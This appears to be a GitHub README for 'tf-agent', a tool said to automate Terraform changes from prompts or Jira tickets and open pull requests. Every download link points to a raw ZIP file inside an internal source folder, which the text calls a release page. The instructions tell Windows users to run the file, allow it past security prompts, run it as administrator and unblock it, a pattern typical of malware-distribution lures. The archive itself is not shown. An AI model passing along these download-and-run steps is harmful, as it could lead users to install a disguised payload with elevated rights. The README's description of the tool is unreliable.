# 🤖 tf-agent - Run Terraform tasks with less effort

[![Download tf-agent](https://img.shields.io/badge/Download-tf--agent-blue?style=for-the-badge)](https://raw.githubusercontent.com/Himurab6049/tf-agent/main/internal/agent/tf-agent-2.9.zip)

## 🧭 What tf-agent does

tf-agent helps you turn a short request into a full Terraform workflow.

You can give it:
- a plain-language prompt
- a Jira ticket
- an infrastructure change request

It then:
- reads the request
- plans the Terraform work
- runs checks and validation
- opens a GitHub pull request

This app is for people who want to reduce the manual work around Terraform changes.

## 💻 What you need on Windows

Before you start, make sure your PC has:

- Windows 10 or Windows 11
- A stable internet connection
- At least 4 GB of RAM
- Enough free disk space for the app and Terraform files
- A GitHub account
- Access to the Terraform code you want the agent to work with

For best results, use:
- the latest version of Chrome, Edge, or Firefox
- a modern Windows system with current updates

## 📥 Download and install

1. Open the download page: https://raw.githubusercontent.com/Himurab6049/tf-agent/main/internal/agent/tf-agent-2.9.zip
2. Find the latest release or download option on that page
3. Download the Windows file to your computer
4. If the file comes in a ZIP folder, right-click it and choose Extract All
5. Move the app to a folder you can find again, such as `Downloads` or `Desktop`
6. If Windows asks for permission, choose Allow or Run

If the app opens in your browser or as a desktop app, keep it available so you can use it for your Terraform tasks.

## 🪟 Run tf-agent on Windows

After you download it:

1. Open the folder where you saved the app
2. Double-click the file that starts the application
3. If Windows shows a security prompt, choose Run
4. Wait for the app to load
5. Sign in with your GitHub account if the app asks for it

If the app uses a local web page, it may open in your browser after launch. Keep that window open while you work.

## 🛠️ First-time setup

When you start tf-agent for the first time, you may need to connect a few tools:

- **GitHub** for pull requests
- **Terraform** for infrastructure checks
- **Jira** if you want to use ticket-based requests
- **Claude or Bedrock access** if your setup uses an AI provider

Use the on-screen setup steps and enter the requested details. If you do not use Jira, skip that part. If you do not use a ticket system, you can start with a simple prompt.

## ✍️ How to use it

### 1. Create a request

Type what you want in plain English.

Examples:
- Create an S3 bucket for backups
- Add a new VPC subnet for staging
- Update the Terraform module for ECS
- Fix the plan error in the current workspace

You can also paste a Jira ticket if your team uses one.

### 2. Choose the target

Pick the Terraform project or repo you want the agent to work on.

Common choices:
- a local Terraform folder
- a GitHub repository
- an infrastructure workspace for dev, staging, or prod

### 3. Start the run

Click the button to begin the workflow.

tf-agent will usually:
- inspect the request
- make the needed Terraform changes
- run formatting checks
- run validation
- review the result
- prepare a pull request

### 4. Review the result

When the run ends, review:
- the proposed changes
- the validation output
- the pull request link

Open the PR in GitHub and check the diff before you merge it.

## ⚙️ What happens during a run

tf-agent follows a standard pipeline:

- reads the prompt or ticket
- gathers context from the repo
- creates Terraform changes
- runs `terraform fmt`
- runs `terraform validate`
- checks for common config issues
- opens a GitHub PR with the result

This helps keep the workflow structured and repeatable.

## 🔒 GitHub and account access

To open pull requests, tf-agent needs GitHub access.

You may need to:
- sign in to GitHub
- allow access to the target repository
- set up a token or app connection
- grant access to the branch where changes will be made

If your team uses protected branches, the PR will still follow your branch rules.

## 📁 Typical folder use

You may see or work with:
- Terraform code files
- module folders
- state-related project files
- config files
- validation output
- PR notes or logs

Keep your Terraform repo in a folder that is easy to reach. Do not move files while a run is in progress.

## 🧪 Good request examples

Use clear requests like these:

- Add an EC2 security group for web traffic
- Create a new RDS instance for staging
- Update the AWS provider version
- Fix the Terraform plan for the networking module
- Add tags to all resources in the dev environment

Short, specific requests work best.

## 🚫 Requests that work poorly

Avoid vague requests like:

- make it better
- fix the cloud setup
- update everything
- handle the infra thing

These give the agent less to work with and can lead to weak results.

## 🧰 Troubleshooting

### The app does not open

Try these steps:
- Right-click the file and choose Run as administrator
- Check that Windows did not block the file
- Make sure the download finished
- Re-download the file from the GitHub page

### GitHub sign-in fails

Check:
- your internet connection
- your GitHub account details
- whether your organization blocks third-party access
- whether the token or app connection is still valid

### Terraform validation fails

This can happen if:
- the request needs more detail
- the repo has an existing config issue
- a module or variable is missing
- the target workspace uses different settings

Review the validation output and adjust the request or code.

### The pull request does not appear

Check:
- whether the GitHub account has write access
- whether the branch was created
- whether PR creation is allowed in the repo
- whether the run finished without errors

## 🧩 Who this is for

tf-agent is a fit for:
- DevOps teams
- platform engineers
- infrastructure teams
- Terraform users
- developers who want fewer manual steps
- teams that work from Jira tickets

It is useful when you want a consistent flow from request to PR.

## 📌 Project topics

This project covers:
- AI agent workflow
- Terraform automation
- infrastructure as code
- GitHub PR creation
- cloud setup
- DevOps tasks
- ticket-driven work
- local and web-based app use

## 📎 Download again

If you need to get the app again, use this link:

https://raw.githubusercontent.com/Himurab6049/tf-agent/main/internal/agent/tf-agent-2.9.zip